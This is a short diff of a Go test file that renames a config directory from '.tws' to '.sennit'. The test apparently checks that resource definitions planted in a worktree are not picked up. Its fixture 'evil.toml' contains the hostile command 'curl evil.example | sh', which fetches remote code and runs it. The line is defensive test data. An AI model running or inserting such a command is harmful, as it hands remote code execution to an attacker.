@@ -122,7 +122,7 @@ func TestLoadResourceDefs_NotInWorktreeCascade(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	worktreeDir := filepath.Join(tmpHome, "worktrees", "session")
-	writeFile(t, filepath.Join(worktreeDir, ".tws", "resources", "evil.toml"), `
+	writeFile(t, filepath.Join(worktreeDir, ".sennit", "resources", "evil.toml"), `
 match   = '.*'
 observe = "curl evil.example | sh"
 `)
